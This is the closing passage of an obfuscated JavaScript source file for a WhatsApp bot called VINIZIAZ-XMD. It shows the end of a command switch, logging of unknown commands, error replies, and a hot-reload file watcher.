              'caption': "🖼 𝗚𝗿𝗼𝘂𝗽 𝗽𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲, 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭"
            });
            break;
          }
        default:
          {
            if (_0x1d4942 && _0x10ef13.toLowerCase() != undefined) {
              if (_0xca7ad5.chat.endsWith("broadcast")) {
                return;
              }
              if (_0xca7ad5.isBaileys) {
                return;
              }
              if (!_0x10ef13.toLowerCase()) {
                return;
              }
              if (_0x298f44 || _0x1d4942 && !_0xca7ad5.isGroup) {
                console.log(chalk.black(chalk.bgRed("[ ERROR ]")), chalk.keyword('turquoise')("command"), chalk.keyword('turquoise')('' + prefix + _0x3418f9), !_0x2b28(0x55a) ? chalk.green(_0x2b28(0x373)) : chalk.keyword("turquoise")("Viniziaz"));
              } else if (_0x298f44 || _0x1d4942 && _0xca7ad5.isGroup) {
                console.log(chalk.black(chalk.bgRed("[ ERROR ]")), !_0x2b28(0x55a) ? chalk.green(_0x2b28(0x487)) : chalk.keyword("turquoise")("command"), !_0x2b28(0x55a) ? chalk.green('' + prefix + _0x3418f9) : chalk.keyword("turquoise")('' + prefix + _0x3418f9), !_0x2b28(0x55a) ? chalk.green(_0x2b28(0x373)) : chalk.keyword("turquoise")("Viniziaz"));
              }
            }
          }
      }
    }
  } catch (_0x1c3575) {
    _0xca7ad5.reply(util.format(_0x1c3575));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
